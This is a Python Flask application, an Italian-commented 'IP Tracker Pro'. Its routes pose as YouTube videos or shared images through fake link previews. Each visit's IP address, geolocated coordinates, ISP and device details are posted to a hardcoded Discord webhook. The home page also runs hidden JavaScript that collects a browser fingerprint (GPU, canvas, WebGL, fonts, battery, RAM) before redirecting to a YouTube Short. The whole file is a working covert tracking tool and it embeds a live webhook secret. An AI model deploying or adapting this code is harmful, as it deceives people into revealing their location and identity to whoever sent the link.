from flask import Flask, request, redirect
from datetime import datetime
import requests
import os
import re
import time
import json

app = Flask(__name__)

# CONFIGURAZIONE
WEBHOOK_URL = "https://discord.com/api/webhooks/1528013241819594853/ajTR7-zJ32yBsxulXb4688xXeWaqVgr9pQk6dW3ffPpFaeWgbWydLkRQyH6M56515lNA"
IMAGE_URL = "https://media.discordapp.net/attachments/1527831756005183559/1528024870393483475/Nuovo_progetto_-_2026-07-18T150514.387.png?ex=6a5ccb8e&is=6a5b7a0e&hm=709fc7a05f8b331d71610beac5dd3757722bb147a2b4a6f7f36d8b2060094563&=&format=webp&quality=lossless&width=17&height=17"

visit_counter = 0
# Dizionario temporaneo per memorizzare fingerprint in attesa del secondo report
pending_fingerprints = {}

def get_ip_info(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "N/D"),
                    "countryCode": data.get("countryCode", "N/D"),
                    "region": data.get("regionName", "N/D"),
                    "city": data.get("city", "N/D"),
                    "zip": data.get("zip", "N/D"),
                    "lat": data.get("lat", "N/D"),
                    "lon": data.get("lon", "N/D"),
                    "timezone": data.get("timezone", "N/D"),
                    "isp": data.get("isp", "N/D"),
                    "org": data.get("org", "N/D"),
                    "as": data.get("as", "N/D"),
                    "asname": data.get("asname", "N/D"),
                    "reverse": data.get("reverse", "N/D"),
                    "mobile": data.get("mobile", False),
                    "proxy": data.get("proxy", False),
                    "hosting": data.get("hosting", False)
                }
    except:
        pass
    return None

def get_device_info(request):
    ua = request.headers.get('User-Agent', '')
    info = {
        "user_agent": ua[:300],
        "browser": "Sconosciuto",
        "browser_version": "?",
        "os": "Sconosciuto",
        "os_version": "?",
        "device": "Desktop",
        "is_mobile": False,
        "is_tablet": False,
        "is_bot": False
    }
    
    bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java']
    if any(bot in ua.lower() for bot in bots):
        info["is_bot"] = True
    
    if 'Windows NT 10' in ua:
        info["os"] = "Windows 10/11"
    elif 'Windows NT 6.3' in ua:
        info["os"] = "Windows 8.1"
    elif 'Windows NT 6.1' in ua:
        info["os"] = "Windows 7"
    elif 'Mac OS X' in ua:
        info["os"] = "macOS"
        version = re.search(r'Mac OS X (\d+[._]\d+)', ua)
        if version:
            info["os_version"] = version.group(1).replace('_', '.')
    elif 'Linux' in ua and 'Android' not in ua:
        info["os"] = "Linux"
    elif 'Android' in ua:
        info["os"] = "Android"
        info["is_mobile"] = True
        info["device"] = "Mobile"
        version = re.search(r'Android (\d+\.\d+)', ua)
        if version:
            info["os_version"] = version.group(1)
    elif 'iPhone' in ua:
        info["os"] = "iOS (iPhone)"
        info["is_mobile"] = True
        info["device"] = "Mobile"
    elif 'iPad' in ua:
        info["os"] = "iOS (iPad)"
        info["is_tablet"] = True
        info["device"] = "Tablet"
    
    if 'Edg/' in ua:
        info["browser"] = "Edge"
        version = re.search(r'Edg/(\d+)', ua)
        if version: info["browser_version"] = version.group(1)
    elif 'Firefox/' in ua:
        info["browser"] = "Firefox"
        version = re.search(r'Firefox/(\d+)', ua)
        if version: info["browser_version"] = version.group(1)
    elif 'Chrome/' in ua and 'Safari/' in ua:
        info["browser"] = "Chrome"
        version = re.search(r'Chrome/(\d+)', ua)
        if version: info["browser_version"] = version.group(1)
    elif 'Safari/' in ua and 'Chrome' not in ua:
        info["browser"] = "Safari"
        version = re.search(r'Version/(\d+)', ua)
        if version: info["browser_version"] = version.group(1)
    elif 'Opera' in ua or 'OPR/' in ua:
        info["browser"] = "Opera"
    
    return info

def get_all_ips(request):
    ips = {
        "ip_pubblico_rete": "N/D",
        "ip_privato_locale": "N/D",
        "ip_proxy": "N/D",
        "x_forwarded_for": "N/D",
        "x_real_ip": "N/D",
        "remote_addr": request.remote_addr
    }
    
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        ips["x_forwarded_for"] = forwarded
        ip_list = [ip.strip() for ip in forwarded.split(',')]
        if ip_list:
            ips["ip_pubblico_rete"] = ip_list[0]
            if len(ip_list) > 1:
                ips["ip_proxy"] = ip_list[-1]
    
    real_ip = request.headers.get('X-Real-IP', '')
    if real_ip:
        ips["x_real_ip"] = real_ip
    
    remote = request.remote_addr
    if remote.startswith(('192.168.', '10.', '172.', '127.')):
        ips["ip_privato_locale"] = remote
    
    return ips

def build_report(ip_data, ip_info, device_info, request_info, route_name, fingerprint=None):
    """Costruisce la descrizione completa del report"""
    global visit_counter
    visit_counter += 1
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    description = f"**📅 Data e Ora:** `{date}`\n"
    description += f"**🔢 Visita #:** `{visit_counter}`\n"
    description += f"**🛤️ Route:** `{route_name}`\n\n"
    
    # IP Info
    description += "**══════ 🌐 INDIRIZZI IP ══════**\n"
    description += f"**🔢 IP Pubblico (Rete):** `{ip_data['ip_pubblico_rete']}`\n"
    if ip_data['ip_privato_locale'] != 'N/D':
        description += f"**🏠 IP Privato (Locale):** `{ip_data['ip_privato_locale']}`\n"
    if ip_data['ip_proxy'] != 'N/D':
        description += f"**🔗 Proxy/VPN:** `{ip_data['ip_proxy']}`\n"
    description += f"**📡 Remote Addr:** `{ip_data['remote_addr']}`\n"
    if ip_data['x_forwarded_for'] != 'N/D':
        description += f"**📋 X-Forwarded-For:** `{ip_data['x_forwarded_for'][:100]}`\n"
    
    # Posizione
    if ip_info:
        description += "\n**══════ 📍 POSIZIONE ══════**\n"
        description += f"**🌍 Paese:** {ip_info.get('country', 'N/D')} ({ip_info.get('countryCode', 'N/D')})\n"
        description += f"**🏙️ Città:** {ip_info.get('city', 'N/D')}, {ip_info.get('region', 'N/D')} {ip_info.get('zip', 'N/D')}\n"
        description += f"**📍 Coordinate:** {ip_info.get('lat', 'N/D')}, {ip_info.get('lon', 'N/D')}\n"
        description += f"**🕐 Timezone:** {ip_info.get('timezone', 'N/D')}\n"
        description += f"**📡 ISP:** {ip_info.get('isp', 'N/D')}\n"
        description += f"**🏢 Org:** {ip_info.get('org', 'N/D')}\n"
        description += f"**🔢 AS:** {ip_info.get('as', 'N/D')} ({ip_info.get('asname', 'N/D')})\n"
        description += f"**🔄 Reverse DNS:** {ip_info.get('reverse', 'N/D')}\n"
        
        flags = []
        if ip_info.get('mobile'): flags.append("📱 Mobile")
        if ip_info.get('proxy'): flags.append("🔒 Proxy/VPN")
        if ip_info.get('hosting'): flags.append("🏢 Hosting/Server")
        if flags:
            description += f"**🚩 Flag:** {' | '.join(flags)}\n"
    
    # Dispositivo
    if device_info:
        description += "\n**══════ 💻 DISPOSITIVO ══════**\n"
        description += f"**🖥️ OS:** {device_info.get('os', 'N/D')} {device_info.get('os_version', '')}\n"
        description += f"**🌐 Browser:** {device_info.get('browser', 'N/D')} v{device_info.get('browser_version', '')}\n"
        description += f"**📱 Tipo:** {device_info.get('device', 'N/D')}\n"
        if device_info.get('is_bot'):
            description += f"**🤖 BOT RILEVATO!**\n"
        description += f"**🔤 Lingue:** {request_info.get('accept_language', 'N/D')[:80]}\n"
        description += f"**🆔 UA:** `{device_info.get('user_agent', 'N/D')[:150]}`\n"
    
    # Richiesta
    description += "\n**══════ 📡 RICHIESTA ══════**\n"
    description += f"**🔗 Referrer:** {request_info.get('referrer', 'N/D')[:80]}\n"
    description += f"**📋 Metodo:** {request_info.get('method', 'N/D')}\n"
    description += f"**🚫 DNT:** {request_info.get('dnt', 'N/D')}\n"
    description += f"**🍪 Cookies:** {request_info.get('cookies', 0)}\n"
    
    # Fingerprinting (se disponibile)
    if fingerprint:
        description += "\n**══════ 🔬 FINGERPRINTING ══════**\n"
        if fingerprint.get('screen'): 
            description += f"**📺 Risoluzione Reale:** {fingerprint['screen']}"
            if fingerprint.get('colorDepth'): description += f" ({fingerprint['colorDepth']})"
            description += "\n"
        if fingerprint.get('viewport'): description += f"**🪟 Viewport:** {fingerprint['viewport']}\n"
        if fingerprint.get('pixelRatio'): description += f"**🔍 Pixel Ratio:** {fingerprint['pixelRatio']}\n"
        if fingerprint.get('platform'): description += f"**💿 Piattaforma:** {fingerprint['platform']}\n"
        if fingerprint.get('cpuCores'): description += f"**⚙️ CPU Core:** {fingerprint['cpuCores']}\n"
        if fingerprint.get('ram'): description += f"**💾 RAM:** {fingerprint['ram']} GB\n"
        if fingerprint.get('connection'): description += f"**📶 Rete:** {fingerprint['connection']}\n"
        if fingerprint.get('touch'): description += f"**👆 Touchscreen:** {fingerprint['touch']}\n"
        if fingerprint.get('battery'):
            description += f"**🔋 Batteria:** {fingerprint['battery']}"
            if fingerprint.get('charging') is not None:
                description += f" | {'🔌 In carica' if fingerprint['charging'] else '🔋 Non in carica'}"
            description += "\n"
        if fingerprint.get('gpu'): description += f"**🎮 GPU:** {fingerprint['gpu']}\n"
        if fingerprint.get('gpuVendor'): description += f"**🏢 Vendor GPU:** {fingerprint['gpuVendor']}\n"
        if fingerprint.get('canvas'): description += f"**🎨 Canvas ID:** `{fingerprint['canvas'][:50]}...`\n"
        if fingerprint.get('webgl'): description += f"**🖼️ WebGL ID:** `{fingerprint['webgl'][:50]}...`\n"
        if fingerprint.get('fonts'): description += f"**🔤 Font Rilevati:** {fingerprint['fonts']}\n"
        if fingerprint.get('timezone'): description += f"**🕐 TZ Browser:** {fingerprint['timezone']}\n"
        if fingerprint.get('language'): description += f"**🌐 Lingua Browser:** {fingerprint['language']}\n"
        if fingerprint.get('cookiesEnabled'): description += f"**🍪 Cookies Abilitati:** {fingerprint['cookiesEnabled']}\n"
        if fingerprint.get('doNotTrack'): description += f"**🚫 Do Not Track:** {fingerprint['doNotTrack']}\n"
        if fingerprint.get('plugins'): description += f"**🔌 Plugin:** {fingerprint['plugins']}\n"
    
    # Mappa Google Maps
    if ip_info and ip_info.get('lat') != 'N/D' and ip_info.get('lon') != 'N/D':
        description += f"\n**🗺️ Mappa:** [Clicca qui](https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']})\n"
    
    return description, date, visit_counter

def send_to_discord(description, ip_data, ip_info, device_info, date, counter):
    """Invia il report completo a Discord"""
    data = {
        "content": f"🔔 **#{counter}** | `{ip_data['ip_pubblico_rete']}` | {ip_info.get('country', '?') if ip_info else '?'} | {device_info.get('os', '?')}",
        "embeds": [{
            "title": "🎯 REPORT COMPLETO",
            "description": description,
            "color": 5814783,
            "timestamp": date,
            "footer": {"text": f"IP Tracker Pro • Visita #{counter}"}
        }]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print(f"✅ Report #{counter}")
        elif response.status_code == 429:
            time.sleep(2)
            requests.post(WEBHOOK_URL, json=data)
    except:
        pass

# ============ ROUTES ============

@app.route("/")
def index():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
    device_info = get_device_info(request)
    request_info = {
        "method": request.method,
        "referrer": request.headers.get('Referer', 'N/D'),
        "accept_language": request.headers.get('Accept-Language', 'N/D'),
        "dnt": request.headers.get('DNT', 'N/D'),
        "cookies": len(request.cookies)
    }
    
    # Genera un ID unico per questa visita
    visit_id = str(int(time.time() * 1000))
    
    # Costruisci report base (senza fingerprint)
    description, date, counter = build_report(ip_data, ip_info, device_info, request_info, "Home")
    
    # Salva temporaneamente i dati per quando arriverà il fingerprint
    pending_fingerprints[visit_id] = {
        "description": description,
        "ip_data": ip_data,
        "ip_info": ip_info,
        "device_info": device_info,
        "date": date,
        "counter": counter,
        "request_info": request_info
    }
    
    # Invia SUBITO il report base
    send_to_discord(description, ip_data, ip_info, device_info, date, counter)
    
    # Pagina con fingerprinting che invia i dati e POI reindirizza
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="YouTube">
        <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
    </head>
    <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
        <p style="color:#fff;font-family:Arial;font-size:18px;">Caricamento...</p>
        <script>
            var fp = {{}};
            var visitId = '{visit_id}';
            
            // Risoluzione REALE (screen.width/height)
            fp.screen = screen.width + 'x' + screen.height;
            fp.colorDepth = screen.colorDepth + ' bit';
            
            // Viewport (area visibile)
            fp.viewport = window.innerWidth + 'x' + window.innerHeight;
            
            // Pixel ratio (per schermi retina)
            fp.pixelRatio = window.devicePixelRatio || '?';
            
            // Piattaforma
            fp.platform = navigator.platform || '?';
            
            // CPU Cores
            fp.cpuCores = navigator.hardwareConcurrency || '?';
            
            // RAM (solo Chrome)
            fp.ram = navigator.deviceMemory || '?';
            
            // Tipo connessione
            if (navigator.connection) {{
                fp.connection = navigator.connection.effectiveType || '?';
                if (navigator.connection.downlink) {{
                    fp.connection += ' (' + navigator.connection.downlink + ' Mbps)';
                }}
            }} else {{
                fp.connection = '?';
            }}
            
            // Touchscreen
            fp.touch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Si' : 'No';
            
            // Timezone browser
            fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // Lingua
            fp.language = navigator.language;
            
            // Cookies
            fp.cookiesEnabled = navigator.cookieEnabled ? 'Si' : 'No';
            
            // Do Not Track
            fp.doNotTrack = navigator.doNotTrack || 'Non impostato';
            
            // Batteria (con await)
            function getBattery() {{
                if (navigator.getBattery) {{
                    navigator.getBattery().then(function(b) {{
                        fp.battery = Math.round(b.level * 100) + '%';
                        fp.charging = b.charging;
                    }}).catch(function(){{}});
                }}
            }}
            getBattery();
            
            // GPU / WebGL
            try {{
                var c = document.createElement('canvas');
                var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {{
                    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    if (dbg) {{
                        fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                        fp.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                    }}
                }}
            }} catch(e) {{}}
            
            // Canvas Fingerprint
            try {{
                var c2 = document.createElement('canvas');
                c2.width = 200;
                c2.height = 50;
                var ctx = c2.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = '#069';
                ctx.fillText('Browser Fingerprint 123!', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Browser Fingerprint 123!', 4, 17);
                fp.canvas = c2.toDataURL().substring(0, 80);
            }} catch(e) {{}}
            
            // WebGL Fingerprint
            try {{
                var c3 = document.createElement('canvas');
                var gl2 = c3.getContext('webgl') || c3.getContext('experimental-webgl');
                if (gl2) {{
                    var ext = gl2.getExtension('WEBGL_debug_renderer_info');
                    var params = [];
                    if (ext) {{
                        params.push(gl2.getParameter(ext.UNMASKED_RENDERER_WEBGL));
                        params.push(gl2.getParameter(ext.UNMASKED_VENDOR_WEBGL));
                    }}
                    fp.webgl = params.join('|').substring(0, 80);
                }}
            }} catch(e) {{}}
            
            // Font Detection (base)
            try {{
                var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma', 'Lucida Console'];
                var testStr = 'mmmmmmmmmmlli';
                var testSize = '72px';
                var available = [];
                var testEl = document.createElement('span');
                testEl.style.fontSize = testSize;
                testEl.style.position = 'absolute';
                testEl.style.visibility = 'hidden';
                testEl.innerHTML = testStr;
                document.body.appendChild(testEl);
                
                var baseWidth = testEl.offsetWidth;
                testEl.style.fontFamily = 'monospace';
                var monoWidth = testEl.offsetWidth;
                
                for (var i = 0; i < fonts.length; i++) {{
                    testEl.style.fontFamily = fonts[i] + ', monospace';
                    if (testEl.offsetWidth !== monoWidth) {{
                        available.push(fonts[i]);
                    }}
                }}
                
                document.body.removeChild(testEl);
                fp.fonts = available.length + '/' + fonts.length + ' rilevati';
            }} catch(e) {{}}
            
            // Plugin
            try {{
                if (navigator.plugins && navigator.plugins.length > 0) {{
                    var plist = [];
                    for (var i = 0; i < Math.min(navigator.plugins.length, 5); i++) {{
                        if (navigator.plugins[i].name) {{
                            plist.push(navigator.plugins[i].name);
                        }}
                    }}
                    fp.plugins = plist.length > 0 ? plist.join(', ') : 'Nessuno';
                }} else {{
                    fp.plugins = 'Nessuno';
                }}
            }} catch(e) {{ fp.plugins = '?'; }}
            
            // Aspetta un attimo per la batteria poi invia
            setTimeout(function() {{
                fetch('/fp?vid=' + visitId, {{
                    method: 'POST',
                    body: JSON.stringify(fp),
                    headers: {{'Content-Type': 'application/json'}}
                }}).then(function() {{
                    window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
                }}).catch(function() {{
                    window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share";
                }});
            }}, 800);
        </script>
    </body>
    </html>
    """

@app.route("/img")
@app.route("/image")
@app.route("/photo")
@app.route("/pic")
def image_tracker():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
    device_info = get_device_info(request)
    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
    
    description, date, counter = build_report(ip_data, ip_info, device_info, request_info, "Immagine")
    send_to_discord(description, ip_data, ip_info, device_info, date, counter)
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="Guarda questa immagine!">
        <meta property="og:description" content="Clicca per vederla meglio">
        <meta property="og:image" content="{IMAGE_URL}">
        <meta property="og:type" content="website">
        <meta name="twitter:card" content="summary_large_image">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ background: #1a1a1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; cursor: pointer; font-family: Arial, sans-serif; }}
            .container {{ text-align: center; padding: 20px; }}
            .container img {{ max-width: 90vw; max-height: 80vh; border-radius: 10px; box-shadow: 0 0 30px rgba(255,255,255,0.1); transition: all 0.3s ease; }}
            .container img:hover {{ transform: scale(1.02); box-shadow: 0 0 40px rgba(255,255,255,0.2); }}
            .container p {{ color: #888; margin-top: 15px; font-size: 14px; }}
        </style>
    </head>
    <body onclick="redirectToVideo()">
        <div class="container">
            <img src="{IMAGE_URL}" alt="Clicca qui" id="mainImage">
            <p>Clicca sull'immagine per continuare...</p>
        </div>
        <script>
            function redirectToVideo() {{ window.location.href = "https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share"; }}
            document.getElementById('mainImage').addEventListener('click', function(e) {{ redirectToVideo(); }});
        </script>
    </body>
    </html>
    """

@app.route("/video")
@app.route("/shorts")
@app.route("/watch")
@app.route("/yt")
def video_preview():
    ip_data = get_all_ips(request)
    ip_info = get_ip_info(ip_data["ip_pubblico_rete"])
    device_info = get_device_info(request)
    request_info = {"method": request.method, "referrer": request.headers.get('Referer', 'N/D'), 
                    "accept_language": request.headers.get('Accept-Language', 'N/D'),
                    "dnt": request.headers.get('DNT', 'N/D'), "cookies": len(request.cookies)}
    
    description, date, counter = build_report(ip_data, ip_info, device_info, request_info, "Video")
    send_to_discord(description, ip_data, ip_info, device_info, date, counter)
    return redirect("https://www.youtube.com/shorts/8W7RA8Akfxo?feature=share")

# Endpoint fingerprint - AGGIORNA il report esistente
@app.route("/fp", methods=["POST"])
def receive_fingerprint():
    global pending_fingerprints
    
    try:
        fp = request.get_json()
        visit_id = request.args.get('vid', '')
        
        if fp and visit_id and visit_id in pending_fingerprints:
            # Recupera i dati salvati
            data = pending_fingerprints[visit_id]
            
            # Ricostruisci la descrizione CON il fingerprint
            description, date, counter = build_report(
                data["ip_data"],
                data["ip_info"],
                data["device_info"],
                data["request_info"],
                "Home",
                fingerprint=fp  # <-- QUI AGGIUNGE IL FINGERPRINT
            )
            
            # Aggiorna il contatore (sottrai 1 perché build_report lo incrementa di nuovo)
            global visit_counter
            visit_counter -= 1
            description, date, counter = build_report(
                data["ip_data"],
                data["ip_info"],
                data["device_info"],
                data["request_info"],
                "Home",
                fingerprint=fp
            )
            
            # Invia il report AGGIORNATO
            send_to_discord(description, data["ip_data"], data["ip_info"], data["device_info"], date, counter)
            
            # Rimuovi dai pending
            del pending_fingerprints[visit_id]
            print(f"✅ Report aggiornato con fingerprint")
    except:
        pass
    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
